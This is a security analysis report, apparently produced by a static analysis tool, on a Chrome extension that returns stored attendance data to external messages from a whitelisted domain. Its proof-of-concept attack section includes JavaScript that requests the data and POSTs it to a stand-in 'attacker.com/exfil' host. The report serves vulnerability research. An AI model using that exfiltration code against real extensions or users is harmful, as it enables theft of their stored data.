# CoCo Analysis: fpegbdpjlgmlbjphonekhfomopigahfb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: storage_sync_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fpegbdpjlgmlbjphonekhfomopigahfb/opgen_generated_files/bg.js
Line 727 `var storage_sync_get_source = { 'key': 'value' };`
Line 1108 `if (result.attendanceData) { result.attendanceData }`

**Code:**

```javascript
// Background script - External message listener (lines 1101-1116)
chrome.runtime.onMessageExternal.addListener(function (
    request,
    sender,
    sendResponse
) {
    if (request === "attendanceData")
        chrome.storage.sync.get(["attendanceData"], function (result) {
            if (result.attendanceData) {
                sendResponse(result.attendanceData); // ← attacker receives stored data
            } else {
                sendResponse({});
            }
        });
    else if (request === "ping") sendResponse("pong");
    else sendResponse(null);
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domain

**Attack:**

```javascript
// From https://uims-assistant.web.app/demo (whitelisted in externally_connectable)
chrome.runtime.sendMessage(
    'fpegbdpjlgmlbjphonekhfomopigahfb',
    'attendanceData',
    function(response) {
        console.log('Stolen attendance data:', response);
        // Send to attacker server
        fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify(response)
        });
    }
);
```

**Impact:** Information disclosure vulnerability. The extension exposes sensitive attendance data stored in chrome.storage.sync to any external website that can send messages to the extension. While manifest.json restricts externally_connectable to "https://uims-assistant.web.app/demo", this creates a vulnerability where if that domain is compromised or XSSed, an attacker can exfiltrate all stored attendance data. According to the methodology, even if only ONE domain can exploit it, this is classified as TRUE POSITIVE.

---
